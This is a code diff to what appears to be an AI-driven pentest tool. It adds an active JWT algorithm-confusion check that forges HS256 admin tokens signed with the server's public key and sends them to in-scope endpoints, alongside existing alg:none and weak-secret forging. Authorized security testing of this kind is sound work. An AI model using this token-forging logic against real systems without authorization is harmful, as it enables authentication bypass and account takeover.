@@ -387,11 +387,13 @@ CLAUDE_TOOLS = [
          "url": {"type": "string", "description": "A base URL or a suspected GraphQL endpoint"}}, "required": ["url"]}},
     {"name": "run_jwt",
      "description": ("ACTIVE: Analyze and attack a JWT (Bearer token). Decodes header/payload, then runs offline "
-                     "attacks: alg:none forge, HMAC weak-secret crack, and — if the secret cracks — forges an admin "
-                     "token. Optionally verifies a forged token against an in-scope endpoint (url + header_name)."),
+                     "attacks: alg:none forge, HMAC weak-secret crack, forges an admin token if the secret cracks, and "
+                     "for RS/ES/PS tokens ACTIVELY confirms algorithm confusion (forge HS256 with the server's public "
+                     "key as the HMAC secret). Optionally verifies forged tokens against an in-scope endpoint (url + header_name)."),
      "input_schema": {"type": "object", "properties": {
          "token": {"type": "string", "description": "The JWT to analyze (three dot-separated base64url parts)"},
          "url": {"type": "string", "description": "Optional in-scope endpoint to test forged tokens against"},
+         "jwks_url": {"type": "string", "description": "Optional in-scope JWKS URL (public keys); auto-derived from url if omitted"},
          "header_name": {"type": "string", "default": "Authorization"},
          "extra_secrets": {"type": "array", "items": {"type": "string"}, "description": "Optional extra secret guesses"}},
          "required": ["token"]}},
@@ -3140,6 +3142,38 @@ class ToolRegistry:
                         "reproduction_steps": [f"Send the {label} forged token to {url}",
                                                f"Observe HTTP {r['status']} (authorized)"],
                         "cwe": "CWE-347", "family": "jwt", "tags": ["jwt", "auth"]})
+
+            # Algorithm confusion (RS/ES/PS -> HS) ACTIVE confirmation: the analyze() lead becomes a CONFIRMED
+            # finding only here. Fetch the server's own RSA public key (its JWKS, or the token's x5c cert),
+            # forge an HS256 token HMAC-signed WITH that public key, and confirm ONLY when it authenticates
+            # where a signature-tampered token is REJECTED (a differential oracle that kills accept-anything FPs).
+            alg = str(res["decoded"]["header"].get("alg", "")).lower()
+            if alg in jt._ASYM_ALGS:
+                pem, x5c = "", res["decoded"]["header"].get("x5c")
+                if isinstance(x5c, list) and x5c:
+                    pem = jt.x5c_to_pem(x5c[0])
+                if not pem:
+                    jwks_urls = ([inp["jwks_url"]] if inp.get("jwks_url") else []) + jt.jwks_candidate_urls(url)
+                    for ju in jwks_urls:
+                        if not self.scope.validate(ju)[0]:
+                            continue
+                        jr = await self._http(ju, "GET", capture=False)
+                        pem = jt.first_rsa_pem(jr.get("body", "") or "")
+                        if pem:
+                            break
+                if pem:
+                    broken = jt.tamper_signature(token)
+                    rb = await self._http(url, headers={hname: wrap(broken)}, capture=True)
+                    if not (200 <= rb.get("status", 0) < 300):        # oracle only valid if a bad sig is rejected
+                        payload = jt.escalate_payload(res["decoded"]["payload"])
+                        for sec in jt.pubkey_secret_variants(pem):
+                            forged = jt.forge_key_confusion(payload, sec)
+                            rf = await self._http(url, headers={hname: wrap(forged)}, capture=True)
+                            if 200 <= rf.get("status", 0) < 300:
+                                findings.append(jt.key_confusion_finding(
+                                    url, "Forged token -> HTTP %d; tampered token -> HTTP %d." % (
+                                        rf.get("status", 0), rb.get("status", 0))))
+                                break
         self.recon.setdefault("jwt", []).append(
             {"header": res["decoded"]["header"], "cracked": bool(res.get("cracked_secret"))})
         summary = f"alg={res['decoded']['header'].get('alg')}, {len(findings)} issue(s)"
